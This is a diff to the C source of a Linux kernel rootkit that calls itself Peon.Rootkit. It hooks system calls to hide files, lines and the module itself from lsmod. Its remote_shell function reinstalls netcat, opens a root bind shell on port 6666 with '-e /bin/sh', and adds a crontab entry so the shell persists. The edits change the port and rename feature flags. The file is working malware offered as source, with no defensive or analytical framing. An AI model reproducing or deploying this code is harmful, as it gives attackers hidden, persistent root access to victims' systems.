@@ -40,19 +40,16 @@
 
 /* define what you want*/
 #define ROOTACCESS
-#define HIDE_MODULE
-#define KEYLOGGER
+#define HIDEMODULE
+//#define KEYLOGGER
 #define HIDECONTENT
-#define HIDEPROCESS
-#define HIDEDIR
-#define KEYLOGGER
-#define HIDECONTENT
+#define HIDEFILE
 #define REMOTESHELL
 #define NETWORK_HTTP
 #define HIDE_COMM
 
 #define SECRETPROCESS "_root_"
-#define SECRETLINE "_root_"
+#define SECRETLINE "--ROOT--"
 #define SECRETFILE "_root_"
 
 #define DEBUG //print
@@ -75,11 +72,11 @@
 
 
 
-#if defined(KEYLOGGER) || defined(HIDEDIR)
+#if defined(KEYLOGGER) || defined(HIDECONTENT)
 #define HOOK_READ
 #endif
 
-#if defined(ROOTACCESS) || defined(HIDE_MODULE)
+#if defined(ROOTACCESS) || defined(HIDEMODULE)
 #define HOOK_KILL
 #endif
 
@@ -424,10 +421,8 @@ asmlinkage long hook_read_call(unsigned int fd, char __user *buf, size_t count) 
 
 #ifdef HIDECONTENT
     if ((fd < 50) && (fd > 2)) {
-
-        char *kbuf, *ch, *ch2;
+        char *kbuf = NULL, *ch = NULL, *ch2 = NULL;
         long modif_ret = 0;
-
         kbuf = (char*) kmalloc(ret + 1, GFP_KERNEL);
 
         if (kbuf == NULL) {
@@ -443,9 +438,11 @@ asmlinkage long hook_read_call(unsigned int fd, char __user *buf, size_t count) 
 
         //if find it
         if (ch != NULL && ch2 != NULL) {
+            printk(KERN_ALERT "Peon.Rootkit: HIDECONTENT\n");
             modif_ret = strlen(ch) - strlen(ch2);
             memmove(ch, ch2 + strlen(SECRETLINE), strlen(ch2) - strlen(SECRETLINE) + 1);
-            copy_to_user(buf, kbuf, ret);
+            *(ch + strlen(ch2) + 2) = 0;
+            copy_to_user(buf, kbuf, modif_ret);
         }
         kfree(kbuf);
     }
@@ -458,7 +455,7 @@ asmlinkage long hook_read_call(unsigned int fd, char __user *buf, size_t count) 
 
 
 
-#ifdef HIDEDIR
+#ifdef HIDEFILE
 #if defined(OS_64_BITS)
 /* -------------------------- 64 bits getdents version ------------------------------------------ */
 asmlinkage long (*orig_getdents) (unsigned int fd, struct linux_dirent __user *dirent, unsigned int count);
@@ -654,8 +651,8 @@ void remote_shell(void) {
     char *envp[] = {"HOME=/", "PATH=/sbin:/usr/sbin:/bin:/usr/bin", 0}; /*Environmement variable*/
     char *argv1[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y remove netcat*", NULL};
     char *argv2[] = {"/bin/sh", "-c", "/usr/bin/apt-get -y install netcat", NULL};
-    char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 1234 -e /bin/sh &", NULL}; /*Command : use netcat to launch a shell on the port 1234*/
-    char *argv4[] = {"/bin/sh", "-c", "echo \"* * * * * root /bin/netcat -l -p 1234 -e /bin/sh\" >> /etc/crontab", NULL};
+    char *argv3[] = {"/bin/sh", "-c", "/bin/netcat -l -p 6666 -e /bin/sh &", NULL}; /*Command : use netcat to launch a shell on the port 1234*/
+    char *argv4[] = {"/bin/sh", "-c", "echo \"* * * * * root /bin/netcat -l -p 6666 -e /bin/sh\" >> /etc/crontab", NULL};
 
     call_usermodehelper(argv1[0], argv1, envp, UMH_WAIT_PROC); /*Remove all netcat version*/
     call_usermodehelper(argv2[0], argv2, envp, UMH_WAIT_PROC); /*Install netcat-taditional*/
@@ -684,10 +681,11 @@ int init_module(void) {
     printk(KERN_INFO "Peon.Rootkit: System call found at : 0x%lx\n", (unsigned long) syscall_table);
 #endif
 
-#ifdef HIDE_MODULE
+#ifdef HIDEMODULE
     /* hide module : lsmod */
     mod = THIS_MODULE; //save module
     list_del(&THIS_MODULE->list);
+    FIRST_SHOW_MODULE = 1;
 #ifdef DEBUG
     printk(KERN_INFO "Peon.Rootkit is hidden\n");
 #endif
@@ -708,10 +706,10 @@ int init_module(void) {
     syscall_table[__NR_kill] = (void*) kill_hook_call;
 #endif
 
-#define HIDEFILE
+#ifdef HIDEFILE
 #if defined(OS_64_BITS)
 
-#ifdef DEBUG	
+#ifdef DEBUG    
     printk(KERN_INFO "Peon.Rootkit: Hide Files 64 bits\n");
 #endif
     /* Save the adress of the original getdents syscall */
@@ -732,6 +730,7 @@ int init_module(void) {
     syscall_table[__NR_getdents64] = (void*) hacked_getdents64;
 
 #endif
+#endif
 
 #ifdef NETWORK_HTTP
     //remove interfacepacket layer2
@@ -740,9 +739,9 @@ int init_module(void) {
     pt.type = htons(ETH_P_ALL);
     pt.func = dev_func;
     dev_add_pack(&pt);
-    #ifdef DEBUG
-        printk(KERN_INFO "Peon.Rootkit is loaded our Network device!\n");
-    #endif
+#ifdef DEBUG
+    printk(KERN_INFO "Peon.Rootkit is loaded our Network device!\n");
+#endif
 #endif
 
 
@@ -798,20 +797,21 @@ void cleanup_module(void) {
 #endif
 
 
-
+#ifdef HIDEFILE
 #if defined(OS_64_BITS)
     syscall_table[ __NR_getdents] = (void*) orig_getdents;
 #else
     syscall_table[ __NR_getdents64] = (void*) orig_getdents64;
+#endif
 #endif
 
 #ifdef NETWORK_HTTP
 
     __dev_remove_pack(&pt); //remove interfacepacket layer2
 
-    #ifdef DEBUG
-        printk(KERN_INFO "Peon.Rootkit remove our Network device!\n");
-    #endif
+#ifdef DEBUG
+    printk(KERN_INFO "Peon.Rootkit remove our Network device!\n");
+#endif
 #endif
 
     enable_wp();
